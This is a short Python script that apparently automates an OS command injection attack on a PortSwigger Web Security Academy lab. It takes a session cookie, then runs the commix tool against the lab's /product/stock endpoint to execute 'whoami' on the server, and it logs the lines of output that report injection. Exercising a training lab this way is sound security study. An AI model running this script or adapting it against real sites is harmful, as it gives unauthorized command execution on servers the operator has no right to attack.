import requests
import pexpect

url = "https://0a87006a04e104718272f24200820093.web-security-academy.net/"

session = requests.Session()
response = session.get(url)

cookies = session.cookies.get_dict()
session_id = cookies.get('session')

full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"

command = [
    "python3", "commix.py",
    "--url", full_url,
    "--cookie", f'session={session_id}',
    "-d", "productId=1&storeId=1",
    "--batch",
    "--os-cmd", "whoami"
]

print("Executing command: ", " ".join(command))

child = pexpect.spawn(" ".join(command), timeout=120)

output_lines = []

while True:
    try:
        index = child.expect([pexpect.EOF, pexpect.TIMEOUT])
        if index == 0:
            break
        elif index == 1:
            print("Timeout waiting for command to complete.")
            break
    except pexpect.exceptions.TIMEOUT:
        print("Command took too long, exiting.")
        break

output = child.before.decode().splitlines()

with open("output.txt", "w", encoding='utf-8') as output_file:
    output_file.write(f"Affected URL : {full_url}\n")
    for line in output:
        if "injectable" in line.lower() or "injection" in line.lower():
            output_file.write(line + "\n")
